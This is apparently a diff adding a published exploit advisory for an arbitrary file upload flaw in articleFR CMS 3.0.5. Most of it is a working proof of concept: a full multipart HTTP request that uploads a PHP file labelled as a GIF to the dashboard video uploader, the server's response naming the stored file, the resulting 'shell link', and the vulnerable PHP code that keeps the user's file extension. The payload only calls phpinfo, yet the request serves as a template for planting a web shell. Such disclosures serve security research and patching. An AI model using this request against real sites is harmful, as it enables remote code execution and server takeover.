@@ -1,0 +1,97 @@
+# Exploit Title: Arbitrary File Upload in articleFR CMS 3.0.5
+# Google Dork: N/A
+# Date: 01/21/2015
+# Exploit Author: Tran Dinh Tien (tien.d.tran@itas.vn) & ITAS Team (www.itas.vn)
+# Vendor Homepage: http://freereprintables.com
+# Software Link: https://github.com/articlefr/articleFR
+# Version: version 3.0.5 
+# Tested on: Linux
+# CVE : N/A
+
+
+::PROOF OF CONCEPT::
+
+- REQUEST:
+
+POST /articlefr/dashboard/videouploader.php HTTP/1.1
+Host: target.org
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://target.org/articlefr/dashboard/videos/fileupload/
+Content-Length: 414
+Content-Type: multipart/form-data; boundary=---------------------------277651700022570
+Cookie: GEAR=local-5422433b500446ead50002d4; PHPSESSID=uc86lsmbm53d73d572tvvec3v4; _ga=GA1.2.884814947.1419214773; __unam=bd22dea-14a6fcadd31-42cba495-9; _gat=1
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+-----------------------------277651700022570
+Content-Disposition: form-data; name="myVideo"; filename="img.php"
+Content-Type: image/gif
+
+<?php 
+phpinfo(); 
+?>
+-----------------------------277651700022570
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------277651700022570
+Content-Disposition: form-data; name=""
+
+undefined
+-----------------------------277651700022570--
+
+
+
+- RESPONSE:
+
+HTTP/1.1 200 OK
+Date: Mon, 22 Dec 2014 03:10:30 GMT
+Server: Apache/2.2.15 (Red Hat)
+Content-Type: text/html
+Vary: Accept-Encoding
+Accept-Ranges: none
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Length: 36
+
+[String_Random].php
+
+- Shell link: http://target.org/articlefr2/dashboard/videos/[String_Random].php
+- Vulnerable file: articlefr/dashboard/videouploader.php
+- Vulnerable code:
+
+<?php
+$output_dir = dirname(dirname(__FILE__)) . "/videos_repository/";
+if(isset($_FILES["myVideo"]))
+{
+	$ret = array();
+
+	$error =$_FILES["myVideo"]["error"];
+	
+	if(!is_array($_FILES["myVideo"]["name"])) 
+	{
+ 	 	$fileName = $_FILES["myVideo"]["name"];
+ 	 	$extension = pathinfo($fileName, PATHINFO_EXTENSION);
+ 	 	$newFileName = md5(uniqid() . $fileName) . '.' . $extension;
+ 	 	
+ 		move_uploaded_file($_FILES["myVideo"]["tmp_name"], $output_dir.$newFileName);
+    	$ret[]= $newFileName;
+	}
+	
+    echo $newFileName;
+ }
+ ?>
+
+
+
+::REFERENCE::
+- http://www.itas.vn/news/itas-team-phat-hien-lo-hong-arbitrarily-file-upload-trong-articlefr-cms-71.html
+
+
+::DISCLAIMER::
+THE INFORMATION PRESENTED HEREIN ARE PROVIDED ?AS IS? WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES AND MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE OR WARRANTIES OF QUALITY OR COMPLETENESS. THE INFORMATION PRESENTED HERE IS A SERVICE TO THE SECURITY COMMUNITY AND THE PRODUCT VENDORS. ANY APPLICATION OR DISTRIBUTION OF THIS INFORMATION CONSTITUTES ACCEPTANCE ACCEPTANCE AS IS, AND AT THE USER'S OWN RISK.
